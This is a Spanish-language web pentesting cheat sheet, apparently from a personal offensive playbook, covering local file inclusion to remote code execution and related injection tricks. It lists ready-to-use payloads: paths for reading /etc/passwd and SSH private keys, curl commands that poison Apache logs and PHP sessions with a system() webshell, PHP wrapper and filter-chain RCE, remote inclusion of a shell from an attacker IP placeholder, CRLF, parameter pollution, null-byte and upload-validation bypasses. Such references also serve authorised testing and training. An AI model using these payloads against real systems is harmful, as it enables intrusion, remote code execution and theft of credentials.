# Chuleta — LFI → RCE y variantes de inyección web

> Fuente: [The Hacker Recipes — Web inputs](https://www.thehacker.recipes/web/inputs) y
> PayloadsAllTheThings.
> Complementa `Tecnicas/lfi.md`, `Tecnicas/rfi.md`, `Tecnicas/file-upload.md` y la sección 80/443
> de `02-enumeracion-servicios.md`.

---

## 1. LFI básico

```text
?file=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php   # leer código fuente PHP
?file=/proc/self/environ
?file=/proc/self/cmdline
```

Rutas útiles en Linux: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `~/.ssh/id_rsa`,
`/var/log/apache2/access.log`, `/var/log/auth.log`, `/var/log/nginx/access.log`.

En Windows: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`,
`web.config`, `C:\inetpub\logs\LogFiles\...`.

---

## 2. LFI → RCE

### 2.1 Log poisoning

Si podés incluir un log que **vos podés escribir** (User-Agent, URL, usuario SSH), inyectás
código PHP y lo incluís.

```bash
# Envenenar el access.log vía User-Agent
curl -s "http://target/" -A "<?php system(\$_GET['c']); ?>"

# Ejecutar
curl -s "http://target/?file=/var/log/apache2/access.log&c=id"
```

Logs típicos: Apache `access.log`/`error.log`, Nginx, SSH `auth.log` (usuario que se loguea),
`mail.log`, `vsftpd.log`.

### 2.2 PHP wrappers

| Wrapper | Uso |
| --- | --- |
| `php://filter/convert.base64-encode/resource=index.php` | leer fuente PHP |
| `php://input` | RCE si `allow_url_include=On` (enviar PHP en el body) |
| `data://text/plain;base64,<b64>` | RCE con `allow_url_include=On` |
| `expect://id` | RCE si la extensión `expect` está cargada |
| `zip://` / `phar://` | incluir un archivo dentro de un zip/phar subido |
| `php://filter/.../resource=...` + filter chains | RCE sin `allow_url_include` |

### 2.3 PHP session

Si la app guarda tu input en la sesión, el PHP queda escrito en
`/var/lib/php/sessions/sess_<PHPSESSID>` (o `/tmp/sess_...`), y después lo incluís.

```bash
# Escribir el payload en la sesión (vía un parámetro que se guarda)
curl -s -c cookies "http://target/?name=<?php system(\$_GET['c']); ?>"
# Incluirla con tu PHPSESSID
curl -b cookies "http://target/?file=/var/lib/php/sessions/sess_<ID>&c=id"
```

También vía **`session.upload_progress`**: se inyecta el payload como nombre de campo en una
subida y queda en el archivo de sesión, mientras se hace un race con el LFI.

### 2.4 phpinfo (race condition)

Si existe `phpinfo.php`, el volcado incluye las variables `$_FILES` con el **nombre temporal**
del archivo subido. Se hace un race: subir un archivo PHP y leer su temp file con el LFI antes
de que se borre.

### 2.5 RFI (Remote File Inclusion)

Si `allow_url_include = On`:

```text
?file=http://<TU_IP>/shell.txt        # shell.txt: <?php system($_GET['c']); ?>
```

### 2.6 PHP filter chains (RCE sin `allow_url_include`)

Generador de cadenas de filtros que convierten un `php://filter` en RCE:

```text
?file=php://filter/convert.iconv...../resource=php://temp
```

Herramienta: `php_filter_chain_generator.py`.

---

## 3. Otras variantes de inyección

### 3.1 CRLF injection

Inyectar `\r\n` (`%0d%0a`) en parámetros, cabeceras o cookies.

- **Response splitting / header injection**: inyectar cabeceras (`Location:`).
- **Log injection**: envenenar logs para LFI log poisoning.
- **XSS** en respuestas cacheadas.

```text
?url=%0d%0aSet-Cookie:%20admin=true
?page=home%0d%0aContent-Length:%200%0d%0a%0d%0a<html>...
```

### 3.2 HTTP Parameter Pollution (HPP)

Parámetros **duplicados**: según el servidor/framework gana el primero, el último o se concatenan.

```text
?id=1&id=2              # el servidor puede usar 1, 2 o "1,2"
?amount=1&amount=1000   # saltar validación que mira el primero
```

Útil para bypass de WAF y de validaciones que leen un parámetro distinto del que usa la lógica.

### 3.3 Null byte

Truncamiento con `%00` (solo PHP < 5.3.4 / entornos antiguos).

```text
?file=../../../../etc/passwd%00.png     # el .png se ignora
?file=../../../../etc/passwd%00
```

### 3.4 Content-Type juggling

En subida de archivos, la validación por `Content-Type` se burla cambiándolo:

```text
Content-Type: image/png          # un .php disfrazado
```

Combinar con doble extensión (`shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`,
`.htaccess` para mapear `.jpg` a PHP), y con la validación por magic bytes.

### 3.5 Open redirect

Un `?redirect=`/`?next=`/`?url=` que redirige a un dominio arbitrario. Uso: phishing, robo de
tokens OAuth, bypass de allowlist.

---

## 4. Encadenamiento con el resto del playbook

1. LFI confirmado → leer código fuente (`php://filter`) para encontrar más bugs.
2. Conseguir RCE por logs/sesión/wrappers → `06-payloads-shells-transferencia.md`.
3. Con RCE pero sin contexto de servicio → `03-privesc-linux.md` / `04-privesc-windows.md`.
